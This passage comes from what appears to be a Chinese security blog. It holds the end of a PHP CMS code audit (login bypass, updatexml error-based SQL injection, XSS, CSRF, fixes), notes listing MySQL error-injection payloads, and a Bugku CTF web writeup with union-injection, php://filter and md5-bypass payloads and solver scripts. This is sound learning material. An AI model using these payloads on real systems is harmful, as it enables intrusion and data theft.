alt></p><p>可以看到,如果登录失败,窗口会重新会到登录页面.设置了cookie用来验证用户.但是从上面的代码分析来看,这里是有漏洞的.因为?r=这里我们是可以修改的.改为登录后的页面即可成功登录后台</p><p><img src="https://i.loli.net/2019/12/22/ShVEo1l4jKWBtdp.png" alt> </p><h2 id="0x03报错注入漏洞"><a href="#0x03报错注入漏洞" class="headerlink" title="0x03报错注入漏洞"></a>0x03报错注入漏洞</h2><p>在登录界面,用单引号’发现会出现报错</p><p>SQL语句有误You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near ‘show databases;’’ at line 1</p><p>在源代码中找到login.php</p><p><img src="https://i.loli.net/2019/12/22/fPjE1iXCmJoSaqI.png" alt></p><p>看到这里user,password是通过POST请求发送到服务器,没有用addslashes()函数转义单引号,然后在数据库中先查询user,如果user在数据库中存在,就返回结果给$users,然后进行密码匹配,如果md5后的密码在数据库中存在,就登录成功.因此这里万能密码是无法登录后台的;但是这里会报错,可以用报错注入的方式得到管user和password.</p><p><img src="https://i.loli.net/2019/12/22/cVt7pliuvjksRmI.png" alt></p><p><img src="https://i.loli.net/2019/12/22/8WyAmSD1XBMwlnq.png" alt="11.png"></p><p>通过updatexml报错语句成功注出数据库的用户名,接着构造login.php中的sql语句</p><pre class=" language-mysql"><code class="language-mysql">1' and 1=(updatexml(1,concat(0x3a,(select user from manage)),1))#</code></pre><p>密码随便输入</p><p><img src="https://i.loli.net/2019/12/22/gHfMGFUVlnKPEBx.png" alt="13.png"></p><p>成功查出user为admin,继续查密码,</p><pre class=" language-mysql"><code class="language-mysql">1' and 1=(updatexml(1,concat(0x3a,(select password from manage)),1))#SQL语句有误：XPATH syntax error: ':21232f297a57a5a743894a0e4a801fc'</code></pre><p>正如博客中笔记写到updatexml报错注入有限制,最大32位,但是md5后的hash值刚好是32位,因此用这种报错语句会方便很多.</p><p><a href="http://d0g1.top/2019/12/21/Sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">Sql注入之报错注入学习笔记</a></p><p>然后将md5值拿去搜索出明文就行了</p><p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a></p><p><img src="https://i.loli.net/2019/12/22/OPfiBHaQKoVbJd8.png" alt="12.png"></p><p>账号: admin 密码:admin 成功利用报错注入登录后台</p><hr><p>在另外一处,同样也没有任何过滤 直接拼接进sql语句.</p><p><img src="https://i.loli.net/2019/12/22/oHVDO58mIFn7lRs.png" alt="14.png"></p><p>但是这里必修是已经成功登录了后台才能进行操作,所以构成的漏洞对网站危害不算特别大(小白的理解-.-)</p><h2 id="0x04联系功能界面昵称存在XSS漏洞"><a href="#0x04联系功能界面昵称存在XSS漏洞" class="headerlink" title="0x04联系功能界面昵称存在XSS漏洞"></a>0x04联系功能界面昵称存在XSS漏洞</h2><p><a href="http://127.0.0.1/?r=submit&amp;type=message" target="_blank" rel="noopener">http://127.0.0.1/?r=submit&amp;type=message</a></p><p>然后自动就弹出了phpinfo界面(也不知道是本地环境问题还是啥…)</p><p><img src="https://i.loli.net/2019/12/22/fcYmejvkEXr8DyL.png" alt="15.png"></p><p>其实本来想在这个留言功能点测试XSS的,</p><p><img src="https://i.loli.net/2019/12/22/BNH1RPAa4sZizUM.png" alt="16.png"></p><p>找到对应的代码,</p><p><img src="https://i.loli.net/2019/12/22/ZfngLXywUA3J2vc.png" alt="17.png"></p><p>这里并没有请求phpinfo,所以应该是本地环境问题 -.-仔细检查是url自动就跳转为127.0.0.1并不是我设置的127.0.0.1/xh/../../</p><p>发布留言的时候,如果昵称为空,为提示昵称不能为空</p><p><img src="https://i.loli.net/2019/12/22/EJrkCBuZs3UnObw.png" alt="18.png"></p><p>找到对应的代码</p><p><img src="https://i.loli.net/2019/12/22/Zz1LrckQM6EKCFq.png" alt="19.png"></p><p>这里对用户输入的name没有用htmlspecialchars_decode()/htmlentities()函数对用户输入的html实体进行转换</p><h2 id="0x05可以但没必要的CSRF"><a href="#0x05可以但没必要的CSRF" class="headerlink" title="0x05可以但没必要的CSRF"></a>0x05可以但没必要的CSRF</h2><p>在manageinfo.php中,也就是资料设置中可以修改密码,但是这里没有设置token验证</p><p><img src="https://i.loli.net/2019/12/22/WtMjLex28UlNn5Z.png" alt="20.png"></p><p>但是这个CMS只允许管理员登录,所以也就没有设置token把(</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ol><li>文件包含设置白名单</li><li>设置常量检查或者重新写一个逻辑,并且对用户的输入进行严格限制</li><li>可以关闭错误回显/或者使用mysql_real_escape_string() 函数对单引号等进行转换(最好)</li><li>使用htmlspecialchars_decode()/htmlentities()函数对用户输入的html特殊字符进行转换</li><li>设置csrf-token和referer对用户进行验证</li></ol><blockquote><p><a href="https://zhidao.baidu.com/question/492459666.html" target="_blank" rel="noopener">PHP 头部defined(‘IN_SYS’)) 有什么作用？</a></p><p>defined() 函数检查某常量是否存在 , 存在的话返回true ;<br>在A页面使用define定义常量x , 在B页面使用defined来确认常量存不存在 , 如果不存在 , 就是非法包含.<br>通常define和defined配合使用 , 可以用来控制文件的<a href="https://www.baidu.com/s?wd=访问权限&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">访问权限</a>，比如，我们不希望一个模板文件被直接通过链接地址被别人访问。我们可以在每个模板文件头，写上defined(‘XXX’) or die()。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入之报错注入学习笔记</title>
      <link href="/posts/20191221/"/>
      <url>/posts/20191221/</url>
      
        <content type="html"><![CDATA[<h1 id="Sql注入之报错注入学习笔记"><a href="#Sql注入之报错注入学习笔记" class="headerlink" title="Sql注入之报错注入学习笔记"></a>Sql注入之报错注入学习笔记</h1><p>平时最常用到的报错注入方式有:floor(),updatexml(),extractvalue() </p><p>floor()函数的报错语句</p><pre class=" language-mysql"><code class="language-mysql">select count(*),(concat(floor(rand(0)*2),(select version())))x from user group by x;</code></pre><p>几个函数知识:</p><p>floor(x):函数表示向下取整,只返回整数部分</p><p>rand(0):.rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。<strong>rand()生成的数字是完全随机的，而rand(0)是有规律的生成</strong></p><a id="more"></a><p><img src="https://i.loli.net/2019/12/21/IbWt4JnEqBmoN1X.png" alt="1.png"></p><p><img src="https://i.loli.net/2019/12/21/HpYRSW9BMjNCDvP.png" alt="2.png"></p><p>注：<strong>group by后面的字段是虚拟表的主键，也就是说它是不能重复的，这是后面报错成功的关键点</strong></p><p>rand(0)*2:将取到0~2的随机数</p><p>0x3a是十六进制的”:”</p><p>updatexml报错原因:updatexml的第二个参数必须是Xpath格式的字符串.(有长度限制,最大32位)</p><p>常见注入语句</p><p>1、通过floor报错,注入语句如下:<br> and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p><p>2、通过ExtractValue报错,注入语句如下:<br> and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p>3、通过UpdateXml报错,注入语句如下:<br> and 1=(updatexml(1,concat(0x3a,(select user())),1))</p><p>4、通过NAME_CONST报错,注入语句如下:<br> and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p><p>5、通过join报错,注入语句如下:<br> select * from(select * from mysql.user ajoin mysql.user b)c;</p><p>6、通过exp报错,注入语句如下:<br> and exp(~(select * from (select user () ) a) );</p><p>7、通过GeometryCollection()报错,注入语句如下:<br> and GeometryCollection(()select *from(select user () )a)b );</p><p>8、通过polygon ()报错,注入语句如下:<br> and polygon (()select * from(select user ())a)b );</p><p>9、通过multipoint ()报错,注入语句如下:<br> and multipoint (()select * from(select user() )a)b );</p><p>10、通过multlinestring ()报错,注入语句如下:<br> and multlinestring (()select * from(selectuser () )a)b );</p><p>11、通过multpolygon ()报错,注入语句如下:<br> and multpolygon (()select * from(selectuser () )a)b );</p><p>12、通过linestring ()报错,注入语句如下:<br> and linestring (()select * from(select user() )a)b );</p><p>参考文章:</p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">sql注入报错注入原理解析</a>    </p><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c" target="_blank" rel="noopener">12种报错注入+万能语句</a> </p><p><strong>未完待续</strong> (还差真题wp)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bugku Writeup</title>
      <link href="/posts/20191220/"/>
      <url>/posts/20191220/</url>
      
        <content type="html"><![CDATA[<p>之前写了很多bugku的题也有那么久的时间了,这里来写写这个平台的wp,也算是复习一下基础入门知识;同时也是给准备入门的同学以及以后的学弟学妹们用的!!!哈哈有个别题目环境有问题了,如果做的时候可以做可以去网上找WP学习如果有#代表没写,记得要写啊!@代表环境存在问题!  <a id="more"></a></p><h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><p>F12后在body中间就可以得到flag</p><h1 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h1><p>修改前端js长度限制,计算出正确的答案得到flag</p><p><img src="https://i.loli.net/2019/12/27/JAPX1jkNB4mFnHG.png" alt="1.png"></p><h1 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h1><p>?what=flag,这题和下一题是去了解HTTP协议,可以看看&lt;&lt;图解HTTP协议&gt;&gt;这本书</p><h1 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h1><p>用Max hackbar,loadurl,选择Post Data,内容为what=flag,然后点击execution</p><h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><ul><li><p>is_numeric()函数用于判断其中的参数是否为数字或者数字字符串,是返回true,否返回flase</p></li><li><p>PHP双等号”==”,在进行比较时会进行强制类型转换</p><p>?num=1a</p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>  F12,在head中有一段js代码.打开js代码.发现一段注释,是html实体编码,将注释内容保存为html,打开这个html文件</p><p>  KEY{J2sa42ahJK-HS11III}</p><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>  打开hosts文件,添加如下内容,然后访问flag.bugku.com</p><p>  123.206.87.240    flag.bugku.com</p><blockquote><p>域名解析是将域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。</p></blockquote><p>  关于域名解析的知识点,可以参考</p><p><a href="https://blog.csdn.net/Ruhe_king/article/details/82421937" target="_blank" rel="noopener">  bugku-域名解析</a></p><h1 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h1><p>bp抓包,多次重放(GO)得到flag.刷新设置在JS代码中</p><h1 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h1><p>题目环境出现问题,无法查看源码,我也没做哈哈</p><h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><ul><li>可变变量和全局变量.两个$,即$$为可变变量.即可变变量的变量名称是其中一个变量的值</li><li>var_dump()函数,打印变量的相关信息,此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。    </li></ul><p>?args=GLOBALS</p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>先右键看源码,复制到sublime text 3 比较方便查看, 是jother编码(用+,!,[],()来编码).这种编码方式的解码方式有</p><ol><li><p>alert(xxx). </p></li><li><p>console(xxx). </p></li><li><p>document.write(xxx)</p><p>直接在Chrome里面console中输入回车出flag,注意大写</p></li></ol></li></ul><h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><p>  Burp Suite抓包,Go一下,在response里面得到flag</p><h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><ul><li><p>目录扫描</p></li><li><p>密码爆破</p><p>打开题目,不能查看源码,也没有任何提示这种题,一般都可以扫一下目录,在御剑中扫到了shell.php</p><p>然后进入这个页面,是一个密码输入框,对其进行爆破.我这里有大字典,需要的可以找我</p><p>当密码为hack时,成功了,输入hack得flag</p><h1 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h1><p>右键查看源码,发现dGVzdDEyMw==,很明显的base64,解码后为test123</p><p>提示IP被禁,联系本地管理员.又是管理员系统.故用admin.test123登录.并通过抓包进行XFF伪造</p><p>X-Forwarded-For:127.0.0.1</p></li></ul><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>查看源代码,定义了p1和p2两个字符串,全是%的url编码</p><p>javascript<br>eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));</p><p>  eval会执行其中的代码,是一个命令执行的函数</p><p>  将p1,p2进行url解码.</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"undefined"</span><span class="token operator">!=</span><span class="token keyword">typeof</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>"67d709b2b</code></pre><pre class=" language-javascript"><code class="language-javascript">54aa2aa648cf6e87a7114f1<span class="token string">"==a.value)return!0;alert("</span>Error<span class="token string">");a.focus();return!1}}document.getElementById("</span>levelQuest"<span class="token punctuation">)</span><span class="token punctuation">.</span>onsubmit<span class="token operator">=</span>checkSubmit<span class="token punctuation">;</span></code></pre><p>  然后把67d709b2b54aa2aa648cf6e87a7114f1输入进去提交得到flag</p><h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><ul><li><p>文件包含,注意有类似这个index.php?file=形式,一般是文件包含的点</p></li><li><p>PHP伪协议</p></li><li><p>payload:<a href="http://123.206.87.240:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></p><p>然后将返回的结果base64解码后得到flag</p></li></ul><h1 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h1><p>爆破,题目提示五位数密码,设置好payload等待结果就行了</p><p><img src="https://i.loli.net/2019/12/27/m3tBqXpvPIjDnaW.png" alt="2.png"></p><h1 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h1><p>hint是JavaScript</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span>clicks <span class="token operator">>=</span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">var</span> form <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;form action="" method="post">'</span> <span class="token operator">+</span>                        <span class="token string">'&lt;input type="text" name="clicks" value="'</span> <span class="token operator">+</span> clicks <span class="token operator">+</span> <span class="token string">'" hidden/>'</span> <span class="token operator">+</span>                        <span class="token string">'&lt;/form>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span><span class="token punctuation">;</span>                        form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>  如果点击了一百万次,就会通过post方法发起请求,使用用hackbar post数据过去就行了</p><p>  clicks=1000000</p><h1 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h1><ul><li><p>目录扫描</p></li><li><p>简单代码审计</p></li><li><p>PHP “==”中的md5漏洞</p><p>扫描网站目录,得到index.php.bak,打开得到源码</p></li></ul><p><img src="https://i.loli.net/2019/12/27/NVF61tcAKzqUmfw.png" alt="3.png"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22   */</span><span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#包含flag.php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#设置无错误回显</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#获取URL中?出现的位置及以后的部分</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#从str中的第二位截取被返回结果</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#把key替换为空,这里双写绕过就行了</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#把str解析到变量中</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"取得flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>  1.PHP中以0e开头都会被当做科学技术法,解析为0</p><blockquote><p>QNKCDZO</p><p>s878926199a</p><p>s155964671a</p><p>s214587387a</p><p>s214587387a</p><p>s878926199a</p><p>s1091221200a</p><p>s1885207154a</p><p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a</p></blockquote><p>  2.数组绕过:md5()函数无法处理数组,返回NULL</p><p>  payload:?kkeyey1[]=123&amp;kkeyey2[]=123213</p><p>  或者?kkeyey1=s155964671a&amp;kkeyey2=s878926199a</p><h1 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h1><blockquote><p>无过滤sqli,按照sqli的步骤一步一步操作即可或者用sqlmap</p></blockquote><p>  判断列数和回显位置,查库表字段,得flag</p><p>  -1’ order by 4# -1’ order by 5# 判断结果为4列</p><p>  -1’ union select 1,2,3,4# 返回2,3,4说明这几个位置是可用的</p><p>  -1’ union select 1,database(),version(),user()# 得到数据库为,skctf_flag</p><p>  -1’ union select 1,(select group_concat(table_name) from information_schema.tables where      table_schema=database()),user(),version()#  得到表名为,fl4g和sc明显前者是我们要的</p><p>  -1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’fl4g’),user(),version()# 得到字段为skctf_flag,然后查具体的值</p><p>  -1’ union select 1,2,3,skctf_flag from fl4g#</p><p>  sqlmap:</p><p>  抓包把http请求内容保存,使用sqlmap -r 命令</p><p><img src="https://i.loli.net/2019/12/27/vZwAQfJcWF9z5jG.png" alt="4.png"></p><p><a href="https://www.freebuf.com/articles/web/160352.html" target="_blank" rel="noopener">详细学习有关知识就这个</a> </p><h1 id="秋名山老司机-python"><a href="#秋名山老司机-python" class="headerlink" title="秋名山老司机(python)"></a>秋名山老司机(python)</h1><p> 多次刷新后发现give me value post about + 计算表达式</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">' http://123.206.87.240:8002/qiumingshan/'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#请求session,保持计算式不变</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>sObj <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'^&lt;div>(.*)=\?;&lt;/div>$'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span>re<span class="token punctuation">.</span>M<span class="token operator">|</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#使用正则表达式匹配计算式</span>d <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"value"</span><span class="token punctuation">:</span>eval<span class="token punctuation">(</span>sObj<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#使用eval计算</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>d<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h1 id="速度要快-python"><a href="#速度要快-python" class="headerlink" title="速度要快(python)"></a>速度要快(python)</h1><p>等python熟悉了补上-.-</p><p>虽然之前做出来了,但是也是看别人脚本打出来的.</p><p>我打算到时候自己写一个</p><h1 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h1><p>将filename进行base64解码后a2V5cy50eHQ=得到keys.txt,将index.phpbase64编码后aW5kZXgucGhw,访问后得只能得到一行代码.这里可以用python读取完整的PHP代码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">'http://123.206.87.240:8002/web11/index.php?line=   {}&amp;filename=aW5kZXgucGhw'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>line<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$line</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'line'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'0'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token string">'keys.txt'</span><span class="token punctuation">,</span><span class="token string">'1'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token string">'index.php'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'margin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'margin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'keys.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$fa</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$fa</span><span class="token punctuation">[</span><span class="token variable">$line</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><img src="https://i.loli.net/2019/12/27/zC1i6paQTkxSDVJ.png" alt="6.png"></p><h1 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give  up"></a>never give  up</h1><p>  查看注释,发现1p.html将其输入进入url中发现会自动跳转到bugku的首页,应该是存在302跳转的.像这种情况,我一般都是用bp抓包</p><p>  得到一串代码,因为其中有%号,所以要进行URL解码,然后将其中base64的部分解码再进行URL解码,得到</p><pre class=" language-php"><code class="language-php">"<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: hello.php?id=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token shell-comment comment">#查找在a中</span><span class="token string">"."</span>第一次出现的位置<span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'no no no no no no no'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token 